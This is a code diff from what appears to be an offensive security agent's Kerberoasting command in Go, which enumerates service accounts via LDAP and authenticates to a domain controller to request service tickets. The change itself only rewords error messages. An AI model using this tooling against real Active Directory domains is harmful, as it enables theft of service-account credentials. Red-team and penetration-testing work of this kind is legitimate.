@@ -41,7 +41,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	defer zeroCredentials(&args.Password)
 
 	if args.Server == "" || args.Username == "" || args.Password == "" {
-		return errorResult("Error: server, username, and password are required. Username should be in UPN format (user@domain.local)")
+		return errorResult("server, username, and password are required. Username should be in UPN format (user@domain.local)")
 	}
 
 	// Auto-detect realm from username if not specified
@@ -49,7 +49,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 		if parts := strings.SplitN(args.Username, "@", 2); len(parts) == 2 {
 			args.Realm = strings.ToUpper(parts[1])
 		} else {
-			return errorResult("Error: realm required. Specify -realm DOMAIN.LOCAL or use UPN username (user@domain.local)")
+			return errorResult("realm required. Specify -realm DOMAIN.LOCAL or use UPN username (user@domain.local)")
 		}
 	} else {
 		args.Realm = strings.ToUpper(args.Realm)
@@ -75,7 +75,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 		// Enumerate SPNs via LDAP
 		spns, err = enumerateSPNs(args, opTimeout)
 		if err != nil {
-			return errorf("Error enumerating SPNs via LDAP: %v", err)
+			return errorf("enumerating SPNs via LDAP: %v", err)
 		}
 		if len(spns) == 0 {
 			return successResult("No kerberoastable accounts found (no user accounts with SPNs)")
@@ -86,7 +86,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	krb5Conf := buildKrb5Config(args.Realm, args.Server)
 	cfg, err := krbconfig.NewFromString(krb5Conf)
 	if err != nil {
-		return errorf("Error creating Kerberos config: %v", err)
+		return errorf("creating Kerberos config: %v", err)
 	}
 
 	// Extract username part (before @) for gokrb5
@@ -98,7 +98,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	cl := client.NewWithPassword(krbUser, args.Realm, args.Password, cfg, client.DisablePAFXFAST(true))
 	err = cl.Login()
 	if err != nil {
-		return errorf("Error authenticating to KDC %s: %v", args.Server, err)
+		return errorf("authenticating to KDC %s: %v", args.Server, err)
 	}
 	defer cl.Destroy()
 
@@ -142,7 +142,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 
 	data, err := json.Marshal(entries)
 	if err != nil {
-		return errorf("Error marshaling results: %v", err)
+		return errorf("marshaling results: %v", err)
 	}
 
 	result := structs.CommandResult{
